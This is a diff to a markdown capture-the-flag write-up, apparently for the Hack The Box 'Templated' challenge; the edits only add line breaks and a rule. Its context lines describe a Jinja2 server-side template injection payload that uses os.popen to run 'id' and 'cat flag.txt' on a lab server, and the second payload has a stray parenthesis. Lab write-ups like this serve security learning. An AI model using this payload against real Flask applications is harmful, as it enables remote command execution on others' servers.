@@ -21,7 +21,7 @@ Can you exploit this simple mistake?
 
 Click on the `Start Instance` button to start the challenge.
 
-Then you are provided with an `web address` in the form of `<ip>:<port>`. Copy it and open it in another tab or browser.
+Then you are provided with an `web address` in the form of `<ip>:<port>`. Copy it and open it in another tab or browser.<br>
 In my case it was `http://46.101.92.17:31311`
 
 ### Homepage of the Webapp :
@@ -29,7 +29,7 @@ In my case it was `http://46.101.92.17:31311`
 ![homepage](/assets/htb/challenge/web/templated/img/homepage.png)
 
 
-The webapp shows a message 
+The webapp shows a message <br>
 `Site still under construction`<br>
 `Proudly powered by Flask/Jinja2`<br>
 
@@ -57,7 +57,7 @@ Then I came across:
 
 ### Creating the exploit:
 
-I have manipulated 
+I have manipulated <br>
 {% raw %}
 `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
 {% endraw %}<br>
@@ -83,12 +83,15 @@ Format:
 http://<Web app address>/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt')).read()}}
 ```
 {% endraw %}
+
 This is how I got the flag.
 
-Just replace `<Web app address>` with the web address that you are provided.
+Just replace `<Web app address>` with the web address that you are provided.<br>
 In my case it was `http://46.101.92.17:31311`
 
 ![exploit](/assets/htb/challenge/web/templated/img/exploit.png)
+
+---
 
 This is how, I solved this challenge.
 
